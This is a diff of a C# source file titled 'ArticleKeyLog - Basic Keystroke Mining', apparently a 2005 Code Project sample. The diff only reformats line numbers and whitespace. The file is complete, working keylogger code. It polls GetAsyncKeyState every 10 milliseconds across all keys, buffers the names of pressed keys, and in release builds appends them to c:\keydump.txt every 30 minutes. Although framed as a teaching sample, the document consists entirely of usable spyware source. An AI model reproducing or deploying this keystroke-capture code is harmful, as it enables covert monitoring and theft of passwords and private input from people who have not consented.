@@ -1,177 +1,177 @@
-1  /*
-  2   *	ArticleKeyLog - Basic Keystroke Mining
-  3   *
-  4   *	Date:	05/12/2005
-  5   *
-  6   *	Author:	Alexander Kent
-  7   *
-  8   *	Description:	Sample Application for the Code Project (www.codeproject.com)
-  9   */
- 10  
- 11  using System;
- 12  using System.IO;
- 13  using System.Windows.Forms;
- 14  using System.Runtime.InteropServices;
- 15  
- 16  namespace KeyLog_Test
- 17  {
- 18  	/// <summary>
- 19  	/// Summary description for Keylogger
- 20  	/// 
- 21  	/// Timer Intervals are in ms, examples:
- 22  	///	60000ms = 1 minute
- 23  	///	1800000ms = 30 minutes
- 24  	/// 36000000ms = 60 minutes
- 25  	/// 
- 26  	/// </summary>
- 27  	/// 	
- 28  	public class Keylogger
- 29  	{
- 30  		/// <summary>
- 31  		/// The GetAsyncKeyState function determines whether a key is up or down at the time 
- 32  		/// the function is called, and whether the key was pressed after a previous call 
- 33  		/// to GetAsyncKeyState.
- 34  		/// </summary>
- 35  		/// <param name="vKey">Specifies one of 256 possible virtual-key codes. </param>
- 36  		/// <returns>If the function succeeds, the return value specifies whether the key 
- 37  		/// was pressed since the last call to GetAsyncKeyState, and whether the key is 
- 38  		/// currently up or down. If the most significant bit is set, the key is down, 
- 39  		/// and if the least significant bit is set, the key was pressed after 
- 40  		/// the previous call to GetAsyncKeyState. </returns>
- 41  		[DllImport("User32.dll")]
- 42  		private static extern short GetAsyncKeyState(
- 43  			System.Windows.Forms.Keys vKey); // Keys enumeration
- 44  
- 45  		[DllImport("User32.dll")]
- 46  		private static extern short GetAsyncKeyState(
- 47  			System.Int32 vKey); 
- 48  
- 49  		private System.String keyBuffer;
- 50  		private System.Timers.Timer timerKeyMine;
- 51  		private System.Timers.Timer timerBufferFlush;
- 52  
- 53  		public Keylogger()
- 54  		{
- 55  			//
- 56  			// keyBuffer
- 57  			//
- 58  			keyBuffer = "";
- 59  
- 60  			// 
- 61  			// timerKeyMine
- 62  			// 
- 63  			this.timerKeyMine = new System.Timers.Timer();
- 64  			this.timerKeyMine.Enabled = true;
- 65  			this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
- 66  			this.timerKeyMine.Interval = 10;
- 67  			
- 68  			// 
- 69  			// timerBufferFlush
- 70  			//
- 71  			this.timerBufferFlush = new System.Timers.Timer();
- 72  			this.timerBufferFlush.Enabled = true;
- 73  			this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
- 74  			this.timerBufferFlush.Interval = 1800000; // 30 minutes
- 75  		}
- 76  
- 77  		/// <summary>
- 78  		/// Itrerating thru the entire Keys enumeration; downed key names are stored in keyBuffer 
- 79  		/// (space delimited).
- 80  		/// </summary>
- 81  		/// <param name="sender"></param>
- 82  		/// <param name="e"></param>
- 83  		private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
- 84  		{
- 85  			foreach(System.Int32 i in Enum.GetValues(typeof(Keys)))
- 86  			{
- 87  				if(GetAsyncKeyState(i) == -32767)
- 88  				{
- 89  					keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
- 90  				}
- 91  			}
- 92  		}
- 93  
- 94  		/// <summary>
- 95  		/// 
- 96  		/// </summary>
- 97  		/// <param name="sender"></param>
- 98  		/// <param name="e"></param>
- 99  		private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
-100  		{
-101  			// Preprocessor Directives
-102  			#if (DEBUG)
-103  				MessageBox.Show(keyBuffer); // debugging help
-104  			#else
-105  					Flush2File(@"c:\keydump.txt", true);
-106  			#endif
-107  		}
-108  
-109  		
-110  		/// <summary>
-111  		/// Transfers key stroke data from temporary buffer storage to permanent memory. 
-112  		/// If no exception gets thrown the key stroke buffer resets.
-113  		/// </summary>
-114  		/// <param name="file">The complete file path to write to.</param>
-115  		/// <param name="append">Determines whether data is to be appended to the file. 
-116  		/// If the files exists and append is false, the file is overwritten. 
-117  		/// If the file exists and append is true, the data is appended to the file. 
-118  		/// Otherwise, a new file is created.</param>
-119  		public void Flush2File(string file, bool append)
-120  		{
-121  			try
-122  			{
-123  				StreamWriter sw = new StreamWriter(file, append);
-124  
-125  				sw.Write(keyBuffer);
-126  
-127  				sw.Close();
-128  
-129  				keyBuffer = ""; // reset
-130  			}
-131  			catch
-132  			{	// rethrow the exception currently handled by 
-133  				// a parameterless catch clause
-134  				throw;
-135  			}
-136  		}
-137  
-138  		#region Properties
-139  		public System.Boolean Enabled
-140  		{
-141  			get
-142  			{
-143  				return timerKeyMine.Enabled && timerBufferFlush.Enabled;
-144  			}
-145  			set
-146  			{
-147  				timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
-148  			}
-149  		}
-150  
-151  		public System.Double FlushInterval
-152  		{
-153  			get
-154  			{
-155  				return timerBufferFlush.Interval;
-156  			}
-157  			set
-158  			{
-159  				timerBufferFlush.Interval = value;
-160  			}
-161  		}
-162  
-163  		public System.Double MineInterval
-164  		{
-165  			get
-166  			{
-167  				return timerKeyMine.Interval;
-168  			}
-169  			set
-170  			{
-171  				timerKeyMine.Interval = value;
-172  			}
-173  		}
-174  		#endregion
-175  
-176  	}
-177  }
+  /*
+    *	ArticleKeyLog - Basic Keystroke Mining
+    *
+    *	Date:	05/12/2005
+     *
+     *	Author:	Alexander Kent
+     *
+     *	Description:	Sample Application for the Code Project (www.codeproject.com)
+     */
+   
+   using System;
+   using System.IO;
+   using System.Windows.Forms;
+   using System.Runtime.InteropServices;
+   
+   namespace KeyLog_Test
+   {
+   	/// <summary>
+   	/// Summary description for Keylogger
+   	/// 
+   	/// Timer Intervals are in ms, examples:
+   	///	60000ms = 1 minute
+   	///	1800000ms = 30 minutes
+   	/// 36000000ms = 60 minutes
+   	/// 
+   	/// </summary>
+   	/// 	
+   	public class Keylogger
+    	{
+   		/// <summary>
+   		/// The GetAsyncKeyState function determines whether a key is up or down at the time 
+   		/// the function is called, and whether the key was pressed after a previous call 
+   		/// to GetAsyncKeyState.
+   		/// </summary>
+   		/// <param name="vKey">Specifies one of 256 possible virtual-key codes. </param>
+   		/// <returns>If the function succeeds, the return value specifies whether the key 
+   		/// was pressed since the last call to GetAsyncKeyState, and whether the key is 
+   		/// currently up or down. If the most significant bit is set, the key is down, 
+   		/// and if the least significant bit is set, the key was pressed after 
+   		/// the previous call to GetAsyncKeyState. </returns>
+   		[DllImport("User32.dll")]
+   		private static extern short GetAsyncKeyState(
+   			System.Windows.Forms.Keys vKey); // Keys enumeration
+   
+   		[DllImport("User32.dll")]
+   		private static extern short GetAsyncKeyState(
+   			System.Int32 vKey); 
+   
+   		private System.String keyBuffer;
+   		private System.Timers.Timer timerKeyMine;
+   		private System.Timers.Timer timerBufferFlush;
+   
+     		public Keylogger()
+   		{
+   			//
+   			// keyBuffer
+   			//
+   			keyBuffer = "";
+   
+   			// 
+   			// timerKeyMine
+   			// 
+   			this.timerKeyMine = new System.Timers.Timer();
+   			this.timerKeyMine.Enabled = true;
+   			this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
+   			this.timerKeyMine.Interval = 10;
+   			
+   			// 
+   			// timerBufferFlush
+   			//
+   			this.timerBufferFlush = new System.Timers.Timer();
+   			this.timerBufferFlush.Enabled = true;
+   			this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
+   			this.timerBufferFlush.Interval = 1800000; // 30 minutes
+   		}
+   
+   		/// <summary>
+   		/// Itrerating thru the entire Keys enumeration; downed key names are stored in keyBuffer 
+   		/// (space delimited).
+   		/// </summary>
+   		/// <param name="sender"></param>
+   		/// <param name="e"></param>
+   		private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+  		{
+   			foreach(System.Int32 i in Enum.GetValues(typeof(Keys)))
+   			{
+   				if(GetAsyncKeyState(i) == -32767)
+   				{
+   					keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
+   				}
+   			}
+   		}
+   
+   		/// <summary>
+   		/// 
+   		/// </summary>
+   		/// <param name="sender"></param>
+   		/// <param name="e"></param>
+   		private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+    		{
+  			// Preprocessor Directives
+  			#if (DEBUG)
+  				MessageBox.Show(keyBuffer); // debugging help
+    			#else
+  					Flush2File(@"c:\keydump.txt", true);
+ 		   	#endif
+     		}
+  
+  		
+    		/// <summary>
+     		/// Transfers key stroke data from temporary buffer storage to permanent memory. 
+    		/// If no exception gets thrown the key stroke buffer resets.
+  	  	/// </summary>
+    		/// <param name="file">The complete file path to write to.</param>
+    		/// <param name="append">Determines whether data is to be appended to the file. 
+  		/// If the files exists and append is false, the file is overwritten. 
+  		/// If the file exists and append is true, the data is appended to the file. 
+  		/// Otherwise, a new file is created.</param>
+  		public void Flush2File(string file, bool append)
+  		{
+  			try
+  			{
+  				StreamWriter sw = new StreamWriter(file, append);
+  
+  				sw.Write(keyBuffer);
+  
+  				sw.Close();
+  
+  				keyBuffer = ""; // reset
+  			}
+  			catch
+  			{	// rethrow the exception currently handled by 
+  				// a parameterless catch clause
+  				throw;
+  			}
+  		}
+  
+  		#region Properties
+  		public System.Boolean Enabled
+  		{
+  			get
+  			{
+  				return timerKeyMine.Enabled && timerBufferFlush.Enabled;
+  			}
+  			set
+  			{
+  				timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
+  			}
+  		}
+  
+   		public System.Double FlushInterval
+  		{
+  			get
+  			{
+  				return timerBufferFlush.Interval;
+  			}
+  			set
+  			{
+  				timerBufferFlush.Interval = value;
+  			}
+  		}
+  
+  		public System.Double MineInterval
+  		{
+  			get
+  			{
+  				return timerKeyMine.Interval;
+  			}
+  			set
+  			{
+  				timerKeyMine.Interval = value;
+  			}
+  		}
+  		#endregion
+  
+  	}
+  }
